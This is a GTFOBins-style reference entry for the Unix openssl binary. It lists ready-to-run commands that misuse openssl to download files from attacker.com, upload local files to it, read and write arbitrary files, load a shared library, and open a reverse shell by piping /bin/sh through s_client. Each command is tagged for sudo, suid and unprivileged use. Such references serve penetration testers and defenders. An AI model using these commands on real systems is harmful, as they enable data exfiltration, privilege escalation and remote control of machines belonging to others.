---
type: gtfobin
name: openssl
platform: Unix
functions: [download, file-read, file-write, library-load, reverse-shell, upload]
tags: [gtfobin, unix, lotl]
---

# openssl

## download

```bash
openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
```
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
openssl enc -in /path/to/input-file
```
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
echo DATA | openssl enc -out /path/to/output-file
```
**Contexts:** sudo, suid, unprivileged

```bash
openssl enc -in /path/to/input-file -out /path/to/output-file
```
**Contexts:** sudo, suid, unprivileged

## library-load

```bash
openssl req -engine ./lib.so
```
**Contexts:** sudo, suid, unprivileged

## reverse-shell

```bash
mkfifo /path/to/temp-socket
/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket
```
_The shell process is not spawn by `openssl`._
**Contexts:** sudo, suid, unprivileged

## upload

```bash
openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
```
**Contexts:** sudo, suid, unprivileged
